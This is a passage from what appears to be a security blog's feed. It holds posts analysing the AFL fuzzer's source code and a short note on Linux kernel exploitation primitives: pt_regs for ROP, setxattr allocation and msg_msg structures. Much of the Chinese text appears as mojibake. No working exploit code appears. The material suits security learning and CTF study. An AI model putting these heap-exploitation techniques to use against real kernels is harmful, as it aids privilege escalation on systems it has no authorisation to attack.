alt="1632794034_615275b20ecc5e3dc8f7d"></p><blockquote><p> å…¶ä¸­<code>__afl_maybe_log()</code>åœ¨æºç åˆ†æpart1ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®å°±æ˜¯æ’æ¡©ä»£ç çš„æ ¸å¿ƒå‡½æ•°</p></blockquote><p>é¦–å…ˆï¼Œ<code>afl-fuzz</code>ä¼šåˆ›å»ºä¸¤ä¸ªç®¡é“ï¼šçŠ¶æ€ç®¡é“å’Œæ§åˆ¶ç®¡é“ï¼Œç„¶åæ‰§è¡Œç›®æ ‡ç¨‹åºã€‚æ­¤æ—¶çš„ç›®æ ‡ç¨‹åºçš„<code>main()</code>å‡½æ•°å·²ç»è¢«æ’æ¡©ï¼Œç¨‹åºæ§åˆ¶æµè¿›å…¥<code>__afl_maybe_log</code>ä¸­ã€‚å¦‚æœfuzzæ˜¯ç¬¬ä¸€æ¬¡æ‰§è¡Œï¼Œåˆ™æ­¤æ—¶çš„ç¨‹åºå°±æˆäº†fork serverä»¬ä¹‹åçš„ç›®æ ‡ç¨‹åºéƒ½ç”±è¯¥fork serveré€šè¿‡forkç”Ÿæˆå­è¿›ç¨‹æ¥è¿è¡Œã€‚fuzzè¿›è¡Œè¿‡ç¨‹ä¸­ï¼Œfork serverä¼šä¸€ç›´æ‰§è¡Œforkæ“ä½œï¼Œå¹¶å°†å­è¿›ç¨‹çš„ç»“æŸçŠ¶æ€é€šè¿‡çŠ¶æ€ç®¡é“ä¼ é€’ç»™<code>afl-fuzz</code>ã€‚</p><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><p>å›åˆ°ä¸»å‡½æ•°ï¼Œæ¥ä¸‹æ¥å³å°†è¿›å…¥ä¸»å¾ªç¯ã€‚å†æ¬¡ä¹‹å‰ä¼šè°ƒç”¨<code>cull_queue()</code>å‡½æ•°ï¼Œå¯¹é˜Ÿåˆ—è¿›è¡Œç²¾ç®€ã€‚ä¸»è¦æ˜¯é€šè¿‡éå†<code>top_rated[]</code>æ¡ç›®ï¼Œç„¶åæ ‡è®°<strong>favored</strong>æ¡ç›®</p><p>è¿™é‡Œçš„å¤„ç†æµç¨‹å¯ä»¥ä¸¾ä¸ªä¾‹å­ç†è§£ï¼Œç°å‡è®¾æœ‰å¦‚ä¸‹tupleå’Œseedä¿¡æ¯ï¼š</p><ul><li><strong>tuple</strong>: t0, t1, t2, t3, t4</li><li><strong>seed</strong>: s0, s1, s2</li><li>åˆå§‹åŒ–<code>temp_v = [1,1,1,1,1]</code></li><li>s1å¯è¦†ç›–t2, t3ï¼Œs2è¦†ç›–t0, t1, t4ï¼Œå¹¶ä¸”top_rated[0] &#x3D; s2ï¼Œtop_rated[2]&#x3D;s1</li></ul><p>å°†æŒ‰ç…§å¦‚ä¸‹è¿‡ç¨‹è¿›è¡Œç­›é€‰å’Œåˆ¤æ–­ï¼š</p><ol><li>é¦–å…ˆåˆ¤æ–­ temp_v[0]&#x3D;1ï¼Œè¯´æ˜t0æ²¡æœ‰è¢«è¦†ç›–ï¼›</li><li>top_rated[0] å­˜åœ¨ (s2) -&gt; åˆ¤æ–­s2å¯ä»¥è¦†ç›–çš„èŒƒå›´ -&gt;<code>trace_mini = [1,1,0,0,1]</code>ï¼›</li><li>æ›´æ–°<code>temp_v=[0,0,1,1,0]</code>ï¼Œ æ ‡è®°s2ä¸º â€œfavoredâ€ï¼›</li><li>ç»§ç»­åˆ¤æ–­ temp_v[1]&#x3D;0ï¼Œè¯´æ˜t1æ­¤æ—¶å·²ç»è¢«è¦†ç›–ï¼Œè·³è¿‡ï¼›</li><li>ç»§ç»­åˆ¤æ–­ temp_v[2]&#x3D;1ï¼Œè¯´æ˜t2æ²¡æœ‰è¢«è¦†ç›–ï¼›</li><li>top_rated[2] å­˜åœ¨ (s1) -&gt; åˆ¤æ–­s1å¯ä»¥è¦†ç›–çš„èŒƒå›´ -&gt;<code>trace_mini=[0,0,1,1,0]</code>ï¼›</li><li>æ›´æ–°<code>temp_v=[0,0,0,0,0]</code>ï¼Œæ ‡è®°s1ä¸º â€œfavoredâ€ï¼›</li><li>æ­¤æ—¶æ‰€æœ‰tupleéƒ½è¢«è¦†ç›–ï¼Œå…·å¤‡â€favoredâ€™æ ‡è®°çš„ä¸ºs1, s2ï¼Œè¿‡ç¨‹ç»“æŸã€‚</li></ol><h2 id="ä¸»å¾ªç¯"><a href="#ä¸»å¾ªç¯" class="headerlink" title="ä¸»å¾ªç¯"></a>ä¸»å¾ªç¯</h2><p>æ¥ä¸‹æ¥ä¾¿è¦è¿›å…¥ä¸»å¾ªç¯ï¼Œç®€åŒ–ç‰ˆä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<span class="hljs-comment">//favored</span><br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      *é˜Ÿåˆ—ä¸ºç©ºï¼Œä»£è¡¨å·²ç»å®Œæˆä¸€è½®ï¼Œæ­¤å¤„å‰©ä½™éƒ¨åˆ†ä¸ºä¸€äº›å‚æ•°å¤„ç†</span><br><span class="hljs-comment">      */</span><br>      ...<br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);<span class="hljs-comment">//æ ¸å¿ƒfuzz caseä»£ç </span><br>   ...<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸»è¦æµç¨‹ä¾¿æ˜¯<code>cull_queue()</code>â€“&gt;<code>fuzz_one()</code>ï¼Œä¸æ–­å¾ªç¯å¾€å¤ã€‚ç”±äº<code>fuzz_one</code>çš„ä»£ç é‡è¿‡é•¿ï¼Œè¿™é‡ŒåªåšåŠŸèƒ½å’Œæµç¨‹åˆ†æï¼š</p><ol><li>æ ¹æ®æ˜¯å¦æœ‰<code>pending_favored</code>å’Œ<code>queue_cur</code>çš„æƒ…å†µï¼ŒæŒ‰ç…§æ¦‚ç‡è¿›è¡Œè·³è¿‡ï¼›æœ‰<code>pending_favored</code>, å¯¹äºå·²ç»fuzzè¿‡çš„æˆ–è€…non-favoredçš„æœ‰99%çš„æ¦‚ç‡è·³è¿‡ï¼›æ— pending_favoredï¼Œ95%è·³è¿‡fuzzed&amp;non-favoredï¼Œ75%è·³è¿‡not fuzzed&amp;non-favoredï¼Œä¸è·³è¿‡favoredï¼›</li><li>å‡å¦‚å½“å‰é¡¹æœ‰æ ¡å‡†é”™è¯¯ï¼Œå¹¶ä¸”æ ¡å‡†é”™è¯¯æ¬¡æ•°å°äº3æ¬¡ï¼Œé‚£ä¹ˆå°±ç”¨calibrate_caseè¿›è¡Œæµ‹è¯•ï¼›</li><li>å¦‚æœæµ‹è¯•ç”¨ä¾‹æ²¡æœ‰ä¿®å‰ªè¿‡ï¼Œé‚£ä¹ˆè°ƒç”¨å‡½æ•°trim_caseå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œä¿®å‰ªï¼›</li><li>ä¿®å‰ªå®Œæ¯•ä¹‹åï¼Œä½¿ç”¨calculate_scoreå¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹è¿›è¡Œæ‰“åˆ†ï¼›</li><li>å¦‚æœè¯¥queueå·²ç»å®Œæˆdeterministicé˜¶æ®µï¼Œåˆ™ç›´æ¥è·³åˆ°havocé˜¶æ®µï¼›</li><li>deterministicé˜¶æ®µå˜å¼‚4ä¸ªstageï¼Œå˜å¼‚è¿‡ç¨‹ä¸­ä¼šå¤šæ¬¡è°ƒç”¨å‡½æ•°common_fuzz_stuffå‡½æ•°ï¼Œä¿å­˜interesting çš„ç§å­ï¼š<ul><li>bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1</li><li>arithmeticï¼Œæ•´æ•°åŠ &#x2F;å‡ç®—æœ¯è¿ç®—</li><li>interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­</li><li>dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢&#x2F;æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­</li><li>havocï¼Œä¸­æ–‡æ„æ€æ˜¯â€œå¤§ç ´åâ€ï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ã€‚</li><li>spliceï¼Œä¸­æ–‡æ„æ€æ˜¯â€œç»æ¥â€ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚</li></ul></li><li>è¯¥è½®å®Œæˆã€‚</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åŸºæœ¬AFLæµç¨‹ç”±ä¸¤ç¯‡æ–‡ç« å™è¿°ï¼Œç”±äºæ—¶é—´é—®é¢˜ï¼Œä¸èƒ½å°†æ¯ä¸ªæ–‡ä»¶ä¸å‡½æ•°åˆ†æé€å½»ã€‚æ¯”å¦‚åƒæ ·æœ¬å˜å¼‚ç­–ç•¥è¿™æ ·çš„æ ¸å¿ƒå†…å®¹å¹¶æ— ä»‹ç»ï¼Œä½†ä¹Ÿå¸Œæœ›å¯¹å¤§å®¶çš„AFLå­¦ä¹ ç†è§£æœ‰æ‰€å¸®åŠ©ã€‚</p><p>æ–‡ç« å¦‚æœ‰çº°æ¼ï¼Œè¯·åœ¨è¯„è®ºåŒºæŒ‡å‡ºï¼Œæˆ‘ä¼šåŠæ—¶ä¿®æ”¹ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€Kernelã€‘ä¸€äº›trickè®°å½•ï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
    <link href="/2023/09/01/%E3%80%90Kernel%E3%80%91%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E7%BB%93%E6%9E%84%E4%BD%93%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/09/01/%E3%80%90Kernel%E3%80%91%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E7%BB%93%E6%9E%84%E4%BD%93%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h2><p>ç”¨äºä¿å­˜<strong>ç”¨æˆ·æ€â€“&gt;å†…æ ¸æ€</strong>åˆ‡æ¢æ—¶çš„ç”¨æˆ·æ€ä¿¡æ¯ï¼Œåœ¨å†…æ ¸æ€è¿”å›æ—¶ä¼šä»<code>pt_regs</code>æ¢å¤æ•°æ®ã€‚å› è€Œè‹¥æˆ‘ä»¬èƒ½æ§åˆ¶rspåˆ°è¾¾æ­¤ä½ç½®ï¼Œå³å¯ä»¥ä½¿ç”¨ç”¨æˆ·æ€å¯„å­˜å™¨å€¼è¾…åŠ©å®ç°ROP</p><p><img src="/img/article/ktrick/t01bacb0bd7eee5eeaa.png" alt="img"></p><h2 id="list-headç»“æ„ä½“"><a href="#list-headç»“æ„ä½“" class="headerlink" title="list_headç»“æ„ä½“"></a>list_headç»“æ„ä½“</h2><p>ç®€å•çš„å†…æ ¸åŒé“¾è¡¨ç»“æ„ï¼Œåœ¨å†…æ ¸ä¸­ç»å¸¸ä½œä¸ºå®ç°åŒé“¾è¡¨ç»“æ„çš„åŸºç¡€ï¼Œå®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//https://elixir.bootlin.com/linux/latest/source/include/linux/types.h#L184</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="setxattrç³»ç»Ÿè°ƒç”¨"><a href="#setxattrç³»ç»Ÿè°ƒç”¨" class="headerlink" title="setxattrç³»ç»Ÿè°ƒç”¨"></a>setxattrç³»ç»Ÿè°ƒç”¨</h2><blockquote><p>ä»a3âœŒçš„d3kheapä¸­å­¦åˆ°çš„ä¸œè¥¿ï¼Œa3âœŒä¹Ÿå¤ªè¶…äººäº†å§ï¼ï¼ï¼åŸæ–‡é“¾æ¥å¦‚ä¸‹ï¼š</p><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">ã€CTF.0x06ã€‘D^ 3CTF2022 d3kheap å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><p>setxattr æ˜¯ä¸€ä¸ªååˆ†ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨æ—ï¼ŒæŠ›å¼€å…¶æœ¬èº«çš„åŠŸèƒ½ï¼Œåœ¨ kernel çš„åˆ©ç”¨å½“ä¸­ä»–å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›<strong>è¿‘ä¹ä»»æ„å¤§å°çš„å†…æ ¸ç©ºé—´ object åˆ†é…</strong></p><p>è§‚å¯Ÿsetxattræºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_setxattr()<br>    path_setxattr()<br>        setxattr()<br></code></pre></td></tr></table></figure><p>åœ¨<code>setxattr()</code>å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong>ï¼Œå®Œæˆå†™å…¥ä¹‹åè¯¥ object åˆä¼šé€šè¿‡ kvfree è¢«é‡Šæ”¾æ‰ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ setxattr <strong>å¤šæ¬¡ä¿®æ”¹ victim çš„å†…å®¹</strong></p><h2 id="msg-queueæ¶ˆæ¯é˜Ÿåˆ—"><a href="#msg-queueæ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="msg_queueæ¶ˆæ¯é˜Ÿåˆ—"></a>msg_queueæ¶ˆæ¯é˜Ÿåˆ—</h2><blockquote><p>åŒæ ·æ¥è‡ªa3âœŒçš„blogï¼Œ a3âœŒç®€ç›´æ˜¯æˆ‘Kernelçš„å¯è’™è€å¸ˆğŸ˜­ğŸ˜­ğŸ˜­</p><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">ã€CTF.0x06ã€‘D^ 3CTF2022 d3kheap å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><p>The syscall about system V message queue</p><ul><li>msggetï¼šcreate a msg queue</li><li>msgsndï¼šsend msg to a msg queue</li><li>msgrcvï¼šrecive msg from a msg queue</li></ul><p>System will create a structure named <strong>msg_queue</strong> when we create a message queue. Here is the definition of this structure.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* current number of bytes on queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* number of messages in queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* max number of bytes on queue */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>When we try to call <code>msgsnd</code> to send a message to a specified message queue, such a srturcture is created in kernel space:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å®é™…ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/img/article/ktrick/5IcVxRaFQtg3HCW.png" alt="image.png"></p><hr><blockquote><p>ä¸‹é¢è¿™äº›ç•™ä¸ªå‘ï¼Œæœ‰ç©ºè¡¥ä¸Š</p></blockquote><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty struct"></a>tty struct</h2><h2 id="seq-operation"><a href="#seq-operation" class="headerlink" title="seq operation"></a>seq operation</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€fuzzã€‘AFLæºç åˆ†æ part 1</title>
    <link href="/2023/08/30/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%201/"/>
    <url>/2023/08/30/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%201/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ¥æƒ³ä¸€å‘¨å†…å®Œæˆï¼Œçœ‹æ¥è¦å»¶æœŸäº†ï¼Œå°½é‡å¸Œæœ›èƒ½åœ¨è¿™å‡ å¤©å†…å®Œæˆå§ï¼Œ31å·æ™šä¸Šè¿˜æœ‰qaxçš„ä¸€é¢ğŸ˜­ğŸ˜­ï¼Œæ°´å¹³æœç„¶è¿˜æ˜¯å¤ªæ¬¡äº†ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/AFL">google&#x2F;AFL(github.com)</a></p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>AFLï¼Œå…¨ç§°â€œAmerican Fuzzy Lopâ€ï¼Œæ˜¯ç”±å®‰å…¨ç ”ç©¶å‘˜Michal Zalewskiå¼€å‘çš„ä¸€æ¬¾åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒé€šè¿‡è®°å½•è¾“å…¥æ ·æœ¬çš„ä»£ç è¦†ç›–ç‡ï¼ˆä»£ç æ‰§è¡Œè·¯å¾„çš„è¦†ç›–æƒ…å†µï¼‰ï¼Œä»¥æ­¤è¿›è¡Œåé¦ˆï¼Œå¯¹è¾“å…¥æ ·æœ¬è¿›è¡Œè°ƒæ•´ä»¥æé«˜è¦†ç›–ç‡ï¼Œä»è€Œæå‡å‘ç°æ¼æ´çš„å¯èƒ½æ€§ã€‚AFLå¯ä»¥é’ˆå¯¹æœ‰æºç å’Œæ— æºç çš„ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œå…¶è®¾è®¡æ€æƒ³å’Œå®ç°æ–¹æ¡ˆåœ¨æ¨¡ç³Šæµ‹è¯•é¢†åŸŸå…·æœ‰ååˆ†é‡è¦çš„æ„ä¹‰ã€‚</p><h3 id="å„æ¨¡å—ç®€è¦è¯´æ˜"><a href="#å„æ¨¡å—ç®€è¦è¯´æ˜" class="headerlink" title="å„æ¨¡å—ç®€è¦è¯´æ˜"></a>å„æ¨¡å—ç®€è¦è¯´æ˜</h3><blockquote><p>æºç æ¨¡å—å›¾åƒä¸€è§ˆï¼Œå›¾æºæ¥è‡ªæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/others-articles/290197.html">AFLäºŒä¸‰äº‹ - FreeBuf</a>ï¼Œä¾µåˆ </p></blockquote><p><img src="/img/article/fuzzAFL1/1632794006_615275964fc6378475599.png" alt="1632794006_615275964fc6378475599"></p><h4 id="æ’æ¡©æ¨¡å—"><a href="#æ’æ¡©æ¨¡å—" class="headerlink" title="æ’æ¡©æ¨¡å—"></a><strong>æ’æ¡©æ¨¡å—</strong></h4><ul><li><code>afl-as.h, afl-as.c, afl-gcc.c</code>ï¼šæ™®é€šæ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹æºç æ’æ¡©ï¼Œç¼–è¯‘å™¨å¯ä»¥ä½¿ç”¨gccï¼Œ clangï¼›</li><li><code>llvm_mode</code>ï¼šllvm æ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹æºç æ’æ¡©ï¼Œç¼–è¯‘å™¨ä½¿ç”¨clangï¼›</li><li><code>qemu_mode</code>ï¼šqemu æ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶æ’æ¡©ã€‚</li></ul><h4 id="fuzzer-æ¨¡å—"><a href="#fuzzer-æ¨¡å—" class="headerlink" title="fuzzer æ¨¡å—"></a><strong>fuzzer æ¨¡å—</strong></h4><ul><li><code>afl-fuzz.c</code>ï¼šfuzzer å®ç°çš„æ ¸å¿ƒä»£ç ï¼ŒAFL çš„ä¸»ä½“ã€‚</li></ul><h4 id="å…¶ä»–è¾…åŠ©æ¨¡å—"><a href="#å…¶ä»–è¾…åŠ©æ¨¡å—" class="headerlink" title="å…¶ä»–è¾…åŠ©æ¨¡å—"></a><strong>å…¶ä»–è¾…åŠ©æ¨¡å—</strong></h4><ul><li><code>afl-analyze</code>ï¼šå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œåˆ†æï¼Œé€šè¿‡åˆ†æç»™å®šçš„ç”¨ä¾‹ï¼Œç¡®å®šæ˜¯å¦å¯ä»¥å‘ç°ç”¨ä¾‹ä¸­æœ‰æ„ä¹‰çš„å­—æ®µï¼›</li><li><code>afl-plot</code>ï¼šç”Ÿæˆæµ‹è¯•ä»»åŠ¡çš„çŠ¶æ€å›¾ï¼›</li><li><code>afl-tmin</code>ï¼šå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œæœ€å°åŒ–ï¼›</li><li><code>afl-cmin</code>ï¼šå¯¹è¯­æ–™åº“è¿›è¡Œç²¾ç®€æ“ä½œï¼›</li><li><code>afl-showmap</code>ï¼šå¯¹å•ä¸ªæµ‹è¯•ç”¨ä¾‹è¿›è¡Œæ‰§è¡Œè·¯å¾„è·Ÿè¸ªï¼›</li><li><code>afl-whatsup</code>ï¼šå„å¹¶è¡Œä¾‹ç¨‹fuzzingç»“æœç»Ÿè®¡ï¼›</li><li><code>afl-gotcpu</code>ï¼šæŸ¥çœ‹å½“å‰CPUçŠ¶æ€ã€‚</li></ul><h4 id="éƒ¨åˆ†å¤´æ–‡ä»¶è¯´æ˜"><a href="#éƒ¨åˆ†å¤´æ–‡ä»¶è¯´æ˜" class="headerlink" title="éƒ¨åˆ†å¤´æ–‡ä»¶è¯´æ˜"></a><strong>éƒ¨åˆ†å¤´æ–‡ä»¶è¯´æ˜</strong></h4><ul><li><code>alloc-inl.h</code>ï¼šå®šä¹‰å¸¦æ£€æµ‹åŠŸèƒ½çš„å†…å­˜åˆ†é…å’Œé‡Šæ”¾æ“ä½œï¼›</li><li><code>config.h</code>ï¼šå®šä¹‰é…ç½®ä¿¡æ¯ï¼›</li><li><code>debug.h</code>ï¼šä¸æç¤ºä¿¡æ¯ç›¸å…³çš„å®å®šä¹‰ï¼›</li><li><code>hash.h</code>ï¼šå“ˆå¸Œå‡½æ•°çš„å®ç°å®šä¹‰ï¼›</li><li><code>types.h</code>ï¼šéƒ¨åˆ†ç±»å‹åŠå®çš„å®šä¹‰ã€‚</li></ul><h2 id="æ™®é€šæ’æ¡©"><a href="#æ™®é€šæ’æ¡©" class="headerlink" title="æ™®é€šæ’æ¡©"></a>æ™®é€šæ’æ¡©</h2><h3 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h3><p><strong>afl-gcc.c</strong>æœ¬è´¨ä¸Šæ˜¯å¯¹GCC å’Œ clangçš„å°è£…ï¼Œæ­£å¦‚å…¶åœ¨æ³¨é‡Šä¸­å†™åˆ°çš„<em>wrapper for GCC and clang</em>ã€‚æœ€å¸¸è§çš„ä½¿ç”¨æ–¹å¼ï¼Œä¾¿æ˜¯åœ¨ä½¿ç”¨**.&#x2F;configure**æ—¶ï¼Œç›´æ¥å°†afl-gccæˆ–ç€afl-clangçš„è·¯å¾„ä¼ ç»™CCï¼›åŒç†å¯¹äºC++ä»£ç ï¼Œåªéœ€ç”¨afl-g++æˆ–è€…afl-clang++è·¯å¾„ä¼ ç»™CXXå³å¯ã€‚</p><p>å‡ ä¸ªé™æ€å…¨å±€å˜é‡:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span><br><span class="hljs-type">static</span> u8** cc_params;              <span 